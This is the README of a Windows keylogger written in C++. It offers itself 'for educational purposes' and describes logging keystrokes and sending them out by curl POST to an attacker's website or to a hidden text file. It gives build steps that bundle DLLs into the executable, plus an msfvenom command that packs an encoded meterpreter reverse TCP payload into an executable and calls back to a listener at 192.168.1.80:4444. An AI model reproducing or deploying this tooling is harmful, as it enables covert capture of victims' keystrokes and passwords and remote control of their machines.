# JohnDoeSpy

# Introduction
<p> This is a simple keylogger for educational purposes. I'm not responsible of your usage. </p>
<p> Keylogger build in C++ for detect keys from keyboards (specific keys only available for french keyboard). You can receive data from url intermediate hosting or by simple text file hidden in your directory. </p>


# HAVE TO KNOW 

<p> This keylogger is build for french keyboard, by the way specific characters will appear with bad matching if you use an other country's keyboard. But any others characters show on <p/>

### WORK ONLY FOR WINDOWS ###


## How to start

* Open terminal from root path project 
* <code> cd build\dllToExe </code>
* <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
* Launch <NameKeylogger.exe>
  
  
 ## Payload metasploit
 
 <code> msfvenom -x .\JohnnyLounch.exe -p windows/meterpreter_reverse_tcp -f exe -e x86/shikata_ga_nai lhost=192.168.1.80 lport=4444  -o JohnnyLounchMeterpreter2.exe </code>

### $_POST['text'] matching request curl for receive data on your website.
### You have an example in web directory
